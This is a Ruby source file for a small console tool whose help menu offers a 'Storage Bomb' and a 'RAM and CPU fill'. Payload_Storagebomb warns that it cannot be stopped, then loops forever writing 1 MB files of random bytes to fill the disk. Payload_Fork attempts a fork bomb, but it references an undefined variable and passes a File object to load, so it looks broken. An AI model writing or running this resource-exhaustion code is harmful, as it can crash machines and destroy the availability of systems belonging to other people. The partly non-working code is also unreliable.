#Methods
def Test()
  puts @SuccessSign + "Test succesful".color(:green)
end

def PauseWait()
@Pause = gets
puts ""
end

def Exit_app()
  abort()
end

def Startup()
  puts @PrimarySign + @ProcessName
  puts @SecondarySign + "Version: " + @Version
  puts @SecondarySign + "Time:" + @Time
  puts @SecondarySign + "Created By: " + @Credits
  puts ""
  puts @InformationSign + "Press enter to continue".color(:green)
  puts ""
end

def Help()
puts ""
puts @PrimarySign + "Helper"
puts @SecondarySign + "Here is the list of available commands"
puts @InformationSign + "For helper do /help"
puts @InformationSign + "For Storage Bomb do /bomb"
puts @InformationSign + "For RAM and CPU fill do /hungry"
puts @InformationSign + "to close program do exit"
puts ""
end

def Payload_Storagebomb()
  puts ""
  puts @WarningSign + "WARNING!: ".color(:red) + "this program can't be stopped once launched"
  puts @InformationSign + "The program will start in 5 seconds"
  sleep(5)
  bomb_file_iteration = 1
  loop do
  bomb_file_name = Random.rand(1000000000000000000000000000000).to_s
  bomb_file_content = Random.new.bytes(1000000).to_s
  bomb_file_time = Time.now
  file_out = File.new(bomb_file_name, 'w+')
  file_out.puts(bomb_file_content)
  puts bomb_file_iteration.to_s.color(:red) + ":".color(:red) + " Created ".color(:cyan) + bomb_file_name.color(:yellow) + " Size: ".color(:cyan) + File.size(bomb_file_name).to_s.color(:yellow) + " Bytes @".color(:cyan) + bomb_file_time.to_s.color(:green)
  bomb_file_iteration.to_i
  bomb_file_iteration+= 1
  end
end

def Payload_Fork
    file_out = File.new(bomb_file_name, 'w+')
    file_out.puts(Random.new.bytes(1000000).to_s)
loop { fork { load(file_out) } }
end
